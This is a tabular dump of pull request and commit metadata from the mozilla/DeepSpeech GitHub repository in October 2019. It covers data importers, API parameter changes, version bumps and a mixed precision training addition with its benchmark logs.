1751,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2466,2466,Augment,Add amplified noises,Spetznazman,57009995,2019-10-25T15:27:42Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ec16362a056100fa36e2286c44e256d5ce1a61dd,No SW installation
1752,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2466,2466,Augment,Add amplified noises,Spetznazman,57009995,2019-10-25T15:27:42Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dce31680b081852e80b8962ef5bc9c1f9c31f858,"Changing into target dir, redirceting stderr"
1753,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2466,2466,Augment,Add amplified noises,Spetznazman,57009995,2019-10-25T15:27:42Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cdf1a1fb018510c9ae34c272fdb08b25f7f4321d,Limiting augmentation and noise samples
1754,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2466,2466,Augment,Add amplified noises,Spetznazman,57009995,2019-10-25T15:27:42Z,NONE,False,115,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d225e129f325a667210124919e39568e63f8e369,Separated hdf5 generation from sample augmentation
1755,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2464,2464,TUDA importer,X-DeepSpeech: NOBUILD,tilmankamp,5991088,2019-10-25T13:05:55Z,CONTRIBUTOR,True,165,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2cdfcff4c6f8de3026fc2944faf0076b534aa94d,TUDA importer
1756,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2463,2463,WIP: Feed TFLite converter with dev set,,lissyx,1645737,2019-10-24T14:35:54Z,COLLABORATOR,False,113,8,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1837d33f4fbd6b2c9b85e92a0abae2c0d7382b49,WIP: Feed TFLite converter with dev set
1757,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2462,2462,Build Python 3.8 wheels,Fixes #2461,lissyx,1645737,2019-10-24T13:04:35Z,COLLABORATOR,True,143,17,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f80dbcda751ddf30b3df8c5477efd198becb2d27,"Build Python 3.8 wheels

Fixes #2461"
1758,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2460,2460,Avoid using references to the same object in sparse_tuple_to_text,@lissyx I think this is the cause of the problem you mentioned on IRC.,reuben,477142,2019-10-24T08:18:06Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,68251d6944390944a5274e03e055a71473fde0f8,Avoid using references to the same object in sparse_tuple_to_text
1759,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2459,2459,Spoken Wikipedia importer,,tilmankamp,5991088,2019-10-23T13:14:25Z,CONTRIBUTOR,True,449,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3424ab2b5daeee9598266499578c82b81320f484,Spoken Wikipedia importer
1760,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2459,2459,Spoken Wikipedia importer,,tilmankamp,5991088,2019-10-23T13:14:25Z,CONTRIBUTOR,True,449,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,010f24578f96c2edab6ea1c38dd3b851eefd90b1,Better alphabet access
1761,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2459,2459,Spoken Wikipedia importer,,tilmankamp,5991088,2019-10-23T13:14:25Z,CONTRIBUTOR,True,449,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,122a007d336a64505492107037f1d7f79db70f5a,Linter induced changes
1762,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2459,2459,Spoken Wikipedia importer,,tilmankamp,5991088,2019-10-23T13:14:25Z,CONTRIBUTOR,True,449,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4be08fa6d34f7c8bf381bd77c2dca05731b20def,Removed dutch ij digraph from normalization blacklist
1763,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2458,2458,Add .Net Framework API doc,Fixes #2457,lissyx,1645737,2019-10-23T09:34:41Z,COLLABORATOR,True,2542,3,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,60cec3722f2c639232c969dc2bb4f81498158671,"Add .Net Framework API doc

Fixes #2457"
1764,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2456,2456,Expose cutoff_prob and cutoff_top_n as parameters of libdeepspeech.so,"As well as PR #2453, I exposed `cutoff_prob` and `cutoff_top_n` on libdeepspeech.so.
These parameters are very important when we support languages having many characters (i.e. Chinese or Japanese).
",ryojiysd,17523227,2019-10-23T05:26:26Z,CONTRIBUTOR,False,32,13,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dae432a766dcbbd1bd96b35870c78cdf9c5e562c,Expose cutoff_prob and cutoff_top_n as parameters of libdeepspeech.so
1765,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2455,2455,Update Dockerfile,"Added line to initialise git-lfs before cloning the repo, without this command lm.binary doesn't pull. If we want this to be versions specific, might also be worth doing a git checkout <version>",lnesteroff,35284740,2019-10-23T02:31:48Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4aa52738aa196053b561036293b926341038a590,"Update Dockerfile

Added line to initialise git-lfs before cloning the repo, without this command lm.binary doesn't pull. If we want this to be versions specific, might also be worth doing a git checkout <version>"
1766,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2454,2454,Add Alphabet.encode analog to .decode and better encapsulate implementation details,,reuben,477142,2019-10-22T12:48:36Z,MEMBER,True,17,11,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f0688ec941ab3495dee65eb54d346491b9679735,Add Alphabet.encode analog to .decode and better encapsulate implementation details
1767,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2453,2453,Expose cutoff_prob and cutoff_top_n as flags,,reuben,477142,2019-10-22T12:36:06Z,MEMBER,True,7,2,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,12baf5ffbc022e0eac3d33da8787543c1b8d5914,Expose cutoff_prob and cutoff_top_n as flags
1768,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2448,2448,Use std::shared_ptr instead of raw pointer for dictionary_,Fixes #2403,lissyx,1645737,2019-10-18T08:16:38Z,COLLABORATOR,True,7,6,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ef3f8004ce7a1125f5b84aaf18e821e0ed2b1391,"Use std::shared_ptr instead of raw pointer for dictionary_

Fixes #2403"
1769,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2447,2447,Update import_cv2.py,"Requires utf8 encoding, without this it tries to read it as ascii and fails",lnesteroff,35284740,2019-10-18T01:49:46Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9055d49b47e002b4b60e370158a947e6cf534561,"Update import_cv2.py

Requires utf8 encoding, without this it tries to read it as ascii and fails"
1770,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2445,2445,Bump VERSION to 0.6.0-alpha.10,,lissyx,1645737,2019-10-17T06:54:00Z,COLLABORATOR,True,5,5,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2cbc79fb8af8f69ef5bd373b3b589e1bfc3e69da,Bump VERSION to 0.6.0-alpha.10
1771,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2441,2441,Test if things explode when using TF 1.15 on Python side,,reuben,477142,2019-10-16T08:20:46Z,MEMBER,False,3,1,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,38d520e04d45b0002f0b423a20be87d64a66d0f1,Test if things explode when using TF 1.15 on Python side
1772,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2440,2440,adding automatic mixed precision description to readme,To reflect new functionality in https://github.com/mozilla/DeepSpeech/pull/2434,vinhngx,7205508,2019-10-16T00:15:03Z,CONTRIBUTOR,False,11,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f083c50dce015ad25f662f944ceffd27d031f6a2,adding automatic mixed precision desc. to readme
1773,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2439,2439,Store graph version on TFLite,,lissyx,1645737,2019-10-15T10:55:35Z,COLLABORATOR,True,125,46,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1939f74ec0272b3713010ae034b1a304ceb9c5c1,Store graph version on TFLite
1774,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2438,2438,Add some debugging helpers behind a preprocessor flag,These are helpful when diagnosing problems with the decoder.,reuben,477142,2019-10-15T10:50:48Z,MEMBER,True,81,4,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,83a89dcae60ff8d0567ad518608c06df822894b1,Add debugging code to trie_load.cc
1775,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2438,2438,Add some debugging helpers behind a preprocessor flag,These are helpful when diagnosing problems with the decoder.,reuben,477142,2019-10-15T10:50:48Z,MEMBER,True,81,4,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,31d81740eeb0506339ec9a967f76fe7dba6a7b29,Add debugging helpers to PathTrie
1776,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2437,2437,Update Homebrew to 2.1.14,,reuben,477142,2019-10-15T10:03:40Z,MEMBER,True,22,22,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a902d7b3434ec5a5fc2d3b1ea64c0c8540a06dac,Update Homebrew to 2.1.14
1777,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2437,2437,Update Homebrew to 2.1.14,,reuben,477142,2019-10-15T10:03:40Z,MEMBER,True,22,22,22,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4d5c9d1868793727bb909cc49d1ee00dab1b81da,Point to updated TensorFlow artifacts
1778,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2435,2435,Uplift general fixes from UTF-8 work,"I'm in the process of cleaning up the decoder UTF-8 mode code for merging, and these are some general fixes from that branch that apply outside of just the context of UTF-8 and can be taken out of that branch. I've tested that they don't negatively affect our WER (in fact they improve it marginally).",reuben,477142,2019-10-14T14:26:44Z,MEMBER,True,43,29,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e75d1e4b610670bf40c591915f7488726c8babb8,Respect --test_output_files from DeepSpeech.py
1779,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2435,2435,Uplift general fixes from UTF-8 work,"I'm in the process of cleaning up the decoder UTF-8 mode code for merging, and these are some general fixes from that branch that apply outside of just the context of UTF-8 and can be taken out of that branch. I've tested that they don't negatively affect our WER (in fact they improve it marginally).",reuben,477142,2019-10-14T14:26:44Z,MEMBER,True,43,29,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e0d8ef75e83f834af36b834d2aa08d2c35cc3f65,Use try_loading and FLAGS.load in --one_shot_infer code
1780,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2435,2435,Uplift general fixes from UTF-8 work,"I'm in the process of cleaning up the decoder UTF-8 mode code for merging, and these are some general fixes from that branch that apply outside of just the context of UTF-8 and can be taken out of that branch. I've tested that they don't negatively affect our WER (in fact they improve it marginally).",reuben,477142,2019-10-14T14:26:44Z,MEMBER,True,43,29,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,739841d73192ecd73e068782fb40333d9db2a761,Respect FLAGS.load in evaluate.py
1781,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2435,2435,Uplift general fixes from UTF-8 work,"I'm in the process of cleaning up the decoder UTF-8 mode code for merging, and these are some general fixes from that branch that apply outside of just the context of UTF-8 and can be taken out of that branch. I've tested that they don't negatively affect our WER (in fact they improve it marginally).",reuben,477142,2019-10-14T14:26:44Z,MEMBER,True,43,29,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3015237e8d8b9a7f1ed814d3e5c69628ff540fb1,Replace incomplete sorts with partial sorts
1782,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2435,2435,Uplift general fixes from UTF-8 work,"I'm in the process of cleaning up the decoder UTF-8 mode code for merging, and these are some general fixes from that branch that apply outside of just the context of UTF-8 and can be taken out of that branch. I've tested that they don't negatively affect our WER (in fact they improve it marginally).",reuben,477142,2019-10-14T14:26:44Z,MEMBER,True,43,29,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c8802a38e7767dea01f2731f243be7f7555f4c28,Don't add special tokens to vocabulary
1783,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2435,2435,Uplift general fixes from UTF-8 work,"I'm in the process of cleaning up the decoder UTF-8 mode code for merging, and these are some general fixes from that branch that apply outside of just the context of UTF-8 and can be taken out of that branch. I've tested that they don't negatively affect our WER (in fact they improve it marginally).",reuben,477142,2019-10-14T14:26:44Z,MEMBER,True,43,29,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,abc687b3b934bf082d9ec9f60283c8f3733a4409,Specify BOS for final scoring at decode if applicable
1784,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2434,2434,Adding GPU automatic mixed precision training,"Automatic Mixed Precision (AMP) training on GPU for TensorFlow has been recently introduced:

https://medium.com/tensorflow/automatic-mixed-precision-in-tensorflow-for-faster-ai-training-on-nvidia-gpus-6033234b2540

Automatic mixed precision training makes use of both FP32 and FP16 precisions where appropriate. FP16 operations can leverage the Tensor cores on NVIDIA GPUs (Volta, Turing or newer architectures) for improved throughput. Mixed precision training also often allows larger batch sizes.

This PR adds GPU automatic mixed precision training to `DeepSpeech` via passing the flags value `--auto_mixed_precision=True`.

```
./DeepSpeech.py --train_files ./train.csv --dev_files ./dev.csv --test_files ./test.csv --automatic_mixed_precision
```

On a Volta generation V100 GPU, automatic mixed precision speeds up DeepSpeech training and  evaluation by ~30%-40%.

Without AMP:
```
Epoch 0 |   Training | Elapsed Time: 4:06:02 | Steps: 60592 | Loss: 171.049121
Epoch 0 | Validation | Elapsed Time: 0:11:49 | Steps: 12229 | Loss: 152.989010 | Dataset: ./dev.csv
...
Epoch 4 |   Training | Elapsed Time: 4:06:11 | Steps: 60592 | Loss: 170.192227
Epoch 4 | Validation | Elapsed Time: 0:11:55 | Steps: 12229 | Loss: 151.621022 | Dataset: ./dev.csv
I Early stop triggered as (for last 4 steps) validation loss: 151.621022 with standard deviation: 0.084157 and mean: 151.590638
I FINISHED optimization in 21:30:26.464164
```

With AMP:
```
Epoch 0 |   Training | Elapsed Time: 2:51:47 | Steps: 60592 | Loss: 171.021818
Epoch 0 | Validation | Elapsed Time: 0:06:54 | Steps: 12229 | Loss: 151.720192 | Dataset: ./dev.csv
...
Epoch 3 |   Training | Elapsed Time: 2:51:46 | Steps: 60592 | Loss: 170.514453
Epoch 3 | Validation | Elapsed Time: 0:06:47 | Steps: 12229 | Loss: 151.553078 | Dataset: ./dev.csv
I Saved new best validating model with loss 151.553078 to: ./amp_training/best_dev-242254
I Early stop triggered as (for last 4 steps) validation loss: 151.553078 with standard deviation: 0.029790 and mean: 151.706624
I FINISHED optimization in 11:59:06.455024
```

To learn more about mixed precision and how it works:

   [Overview of Automatic Mixed Precision for Deep Learning](https://developer.nvidia.com/automatic-mixed-precision)
    [NVIDIA Mixed Precision Training Documentation](https://docs.nvidia.com/deeplearning/sdk/mixed-precision-training/index.html)
    [NVIDIA Deep Learning Performance Guide](https://docs.nvidia.com/deeplearning/sdk/dl-performance-guide/index.html)",vinhngx,7205508,2019-10-14T13:12:10Z,CONTRIBUTOR,True,6,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,909fa60601f4e11ee686abaf7347097a2b6e6720,adding automatic mixed precision training support
1785,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2434,2434,Adding GPU automatic mixed precision training,"Automatic Mixed Precision (AMP) training on GPU for TensorFlow has been recently introduced:

https://medium.com/tensorflow/automatic-mixed-precision-in-tensorflow-for-faster-ai-training-on-nvidia-gpus-6033234b2540

Automatic mixed precision training makes use of both FP32 and FP16 precisions where appropriate. FP16 operations can leverage the Tensor cores on NVIDIA GPUs (Volta, Turing or newer architectures) for improved throughput. Mixed precision training also often allows larger batch sizes.

This PR adds GPU automatic mixed precision training to `DeepSpeech` via passing the flags value `--auto_mixed_precision=True`.

```
./DeepSpeech.py --train_files ./train.csv --dev_files ./dev.csv --test_files ./test.csv --automatic_mixed_precision
```

On a Volta generation V100 GPU, automatic mixed precision speeds up DeepSpeech training and  evaluation by ~30%-40%.

Without AMP:
```
Epoch 0 |   Training | Elapsed Time: 4:06:02 | Steps: 60592 | Loss: 171.049121
Epoch 0 | Validation | Elapsed Time: 0:11:49 | Steps: 12229 | Loss: 152.989010 | Dataset: ./dev.csv
...
Epoch 4 |   Training | Elapsed Time: 4:06:11 | Steps: 60592 | Loss: 170.192227
Epoch 4 | Validation | Elapsed Time: 0:11:55 | Steps: 12229 | Loss: 151.621022 | Dataset: ./dev.csv
I Early stop triggered as (for last 4 steps) validation loss: 151.621022 with standard deviation: 0.084157 and mean: 151.590638
I FINISHED optimization in 21:30:26.464164
```

With AMP:
```
Epoch 0 |   Training | Elapsed Time: 2:51:47 | Steps: 60592 | Loss: 171.021818
Epoch 0 | Validation | Elapsed Time: 0:06:54 | Steps: 12229 | Loss: 151.720192 | Dataset: ./dev.csv
...
Epoch 3 |   Training | Elapsed Time: 2:51:46 | Steps: 60592 | Loss: 170.514453
Epoch 3 | Validation | Elapsed Time: 0:06:47 | Steps: 12229 | Loss: 151.553078 | Dataset: ./dev.csv
I Saved new best validating model with loss 151.553078 to: ./amp_training/best_dev-242254
I Early stop triggered as (for last 4 steps) validation loss: 151.553078 with standard deviation: 0.029790 and mean: 151.706624
I FINISHED optimization in 11:59:06.455024
```

To learn more about mixed precision and how it works:

   [Overview of Automatic Mixed Precision for Deep Learning](https://developer.nvidia.com/automatic-mixed-precision)
    [NVIDIA Mixed Precision Training Documentation](https://docs.nvidia.com/deeplearning/sdk/mixed-precision-training/index.html)
    [NVIDIA Deep Learning Performance Guide](https://docs.nvidia.com/deeplearning/sdk/dl-performance-guide/index.html)",vinhngx,7205508,2019-10-14T13:12:10Z,CONTRIBUTOR,True,6,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e0bd1423b526ca30c11368d647b098d39ca4f979,adding automatic mixed precision training support
1786,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2433,2433,"Expose beam width, lm_alpha and lm_beta in CLI args",,lissyx,1645737,2019-10-14T12:00:11Z,COLLABORATOR,True,41,36,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ef5ae5c0b46900ca1cba3b5bdca23c69f97cac87,"Expose beam width, lm_alpha and lm_beta in CLI args"
1787,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2432,2432,Update doc link for model compatibility,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-10-12T15:14:24Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c15d9b4b8bac70db81fbabc0226ddd9521753ff5,"Update doc link for model compatibility

X-DeepSpeech: NOBUILD"
1788,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2431,2431,Add missing doc for new API,X-DeepSpeech: NOBUILD,lissyx,1645737,2019-10-12T15:05:05Z,COLLABORATOR,True,3,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b536f5761f3d3b5edaf6e68ca545da225166926d,"Add missing doc for new API

X-DeepSpeech: NOBUILD"
1789,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2429,2429,Debug build for decoder package,,reuben,477142,2019-10-11T16:02:21Z,MEMBER,True,27,9,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aad1b2234b832f0ab6615acae280e86fec556648,Debug build for ds_ctcdecoder package
1790,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2428,2428,Setted default param of skiplist to '',fixing issue found in https://github.com/MozillaItalia/DeepSpeech-Italian-Model/pull/21,mone27,17617810,2019-10-11T14:43:09Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a867c919bd348fd194b853462d9e595baba0be79,"Setted default param of skiplist to ''

fixing issue found in https://github.com/MozillaItalia/DeepSpeech-Italian-Model/pull/21"
1791,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2427,2427,Bump VERSION to 0.6.0-alpha.9,,lissyx,1645737,2019-10-11T10:56:50Z,COLLABORATOR,True,5,5,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,156a16e330203e3b567ea46bbd3e0388e8d1416e,Bump VERSION to 0.6.0-alpha.9
1792,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2426,2426,Bump graph version due to forget_bias change,This should avoid any problems with people trying to use older exports (even if they can make them by hacking around with the Saver).,reuben,477142,2019-10-10T22:00:57Z,MEMBER,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ce0292b92cc07c52b89642e8ddd8f02e4c745524,Bump graph version due to forget_bias change
1793,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2426,2426,Bump graph version due to forget_bias change,This should avoid any problems with people trying to use older exports (even if they can make them by hacking around with the Saver).,reuben,477142,2019-10-10T22:00:57Z,MEMBER,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7dc2be1a9b46e1ab14e89990b179a78ca9070daa,Point examples to ldc93s1 model with new graph version
1794,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2425,2425,Expose sample rate value in API and use it in in-tree consumers,,reuben,477142,2019-10-10T20:11:02Z,MEMBER,True,113,48,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0241f725cdf2b905ada67fb17550d522f5fde8a4,Expose model sample rate in API
1795,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2425,2425,Expose sample rate value in API and use it in in-tree consumers,,reuben,477142,2019-10-10T20:11:02Z,MEMBER,True,113,48,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c1ed6d711d68bc7e5e59e0f35054adda261fac77,Use model sample rate in client.cc
1796,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2425,2425,Expose sample rate value in API and use it in in-tree consumers,,reuben,477142,2019-10-10T20:11:02Z,MEMBER,True,113,48,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,afea2b423189411c41234ab94b27a1e5d50a2a89,Expose and use model sample rate in Python
1797,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2425,2425,Expose sample rate value in API and use it in in-tree consumers,,reuben,477142,2019-10-10T20:11:02Z,MEMBER,True,113,48,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0be2787e4ec96edfb92d1e2ac80c4e6f74327198,Expose and use model sample rate in JavaScript
1798,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2425,2425,Expose sample rate value in API and use it in in-tree consumers,,reuben,477142,2019-10-10T20:11:02Z,MEMBER,True,113,48,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5cb15ca6ed80d35529e536b4024cc123845955ae,Use model sample rate in examples
1799,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2425,2425,Expose sample rate value in API and use it in in-tree consumers,,reuben,477142,2019-10-10T20:11:02Z,MEMBER,True,113,48,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4dc18dd8ee943438b649861bb483ebcf140815ca,Expose and use model sample rate in .NET
1800,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2425,2425,Expose sample rate value in API and use it in in-tree consumers,,reuben,477142,2019-10-10T20:11:02Z,MEMBER,True,113,48,14,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,673d620a67644f73aace97964851b4b9405350c1,Expose and use model sample rate in Java
1801,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2424,2424,Fix broken references to README.md,"Fixes #2423

X-DeepSpeech: NOBUILD",lissyx,1645737,2019-10-10T20:05:25Z,COLLABORATOR,True,9,9,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,32e9b8cd3e72a40c756f8d76b092b8a283862fb9,"Fix broken references to README.md

Fixes #2423

X-DeepSpeech: NOBUILD"
1802,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2420,2420,Remove unused sample rate param from API,,reuben,477142,2019-10-09T14:35:06Z,MEMBER,True,114,114,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f4116695ff370a0186c8c0c3e9f4424c27cb19f,Remove unused sample rate param from API
1803,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2420,2420,Remove unused sample rate param from API,,reuben,477142,2019-10-09T14:35:06Z,MEMBER,True,114,114,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,abb11f040de720e626669cda821bfdd05e8297d6,Remove sample rate parameter usage from client.cc
1804,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2420,2420,Remove unused sample rate param from API,,reuben,477142,2019-10-09T14:35:06Z,MEMBER,True,114,114,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,97bab38a7e7e48e19cf05a85b217ce060d79c09f,Remove sample rate parameter usage from Python binding
1805,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2420,2420,Remove unused sample rate param from API,,reuben,477142,2019-10-09T14:35:06Z,MEMBER,True,114,114,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,385279bc20bec42b67921f2c8fe5d3bc83a9681a,Remove sample rate parameter usage from JavaScript binding
